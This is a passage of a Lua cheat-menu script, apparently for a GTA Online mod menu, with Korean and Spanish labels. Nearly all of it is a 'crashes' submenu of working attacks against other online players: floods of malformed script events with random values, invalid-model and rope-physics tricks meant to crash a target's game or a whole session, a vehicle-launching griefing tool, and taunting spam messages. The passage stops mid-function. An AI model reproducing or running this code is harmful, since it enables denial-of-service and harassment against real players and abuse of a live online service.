            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    menu.action_slider(glitchiar, "선수 자동차 출시", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("차 안에 없어요 D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("차량을 제어할 수 없습니다. D:")
            return
        end

        pluto_switch value do
            case "Lanzar Arriba":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Adelante":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Atras":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Abajo":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapulta":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)





    crashes = menu.list(malicious, "크레쉬", {}, "크레쉬 Op", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}

    menu.action(crashes, "프레임 충돌", {}, "인기 메뉴에 의해 차단됨", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    -- Prisuhm crash
    menu.action(crashes, "모델 V1", {"crashv1"}, "펑션 (인기 메뉴 - 스탠드)", function()
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(player_id, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(player_id)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
                util.toast("모델 로드 중 오류가 발생했습니다.")
            end
        end)
    end)

    menu.action(crashes, "스크립트 V1", {}, "스크립트 기반 크래시", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end)

    --menu.action(crashes, "Test", {""}, "", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    --    end)
    --end)

    menu.divider(crashes, "(세션)")

    menu.action(crashes, "충돌 세션 V1 'Test'", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(crashes, "충돌 세션 V2 'Test'", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)


    menu.divider(crashes, "(라이즈 익스클루시보)")

    menu.action(crashes, "말할 수 없는", {"crashv2"}, "푼칸도 (Menus populares - Stand)", function()
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
    end)

    menu.action(crashes, "말할 수 없는 V2", {"crashv3"}, "펑션 (인기 메뉴 - 스탠드)", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    local twotake = menu.list(crashes, "2T1 크래쉬", {}, "")

    local modelc = menu.list(twotake, "모델 충돌", {}, "")


    menu.action(modelc, "모델로 인발리도 V1", {"crashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(modelc, "잘못된 모델 V2", {"crashv5"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(modelc, "잘못된 모델 V3", {"crashv10"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " 폭발 " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(modelc, "모델로 인발리도 V4", {"crashv12"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)

    menu.action(modelc, "임볼리도 모델 V5", {"crashv18"}, "X-force는 막을수 없습니다.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(player_id)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(player_id) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)


    menu.action(modelc, "임볼리도 모델 V6", {"crashv19"}, "X-force는 막을수 없습니다.", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(modelc, "임볼리도 모델 V7", {"crashv26"}, "X-force는 막을수 없습니다.", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    menu.action(modelc, "임볼리도 모델 V8 'Test (1 use)'", {"crashv27"}, "X-force는 막을수 없습니다. (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)


            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)

    local netc = menu.list(twotake, "크라셰스 데 레드", {}, "")

    -- Skidded from keramist.

    menu.action(netc, "크라세오스 드 레드 V1", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)

    menu.action(netc, "크라세오스 드 레드 V2", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
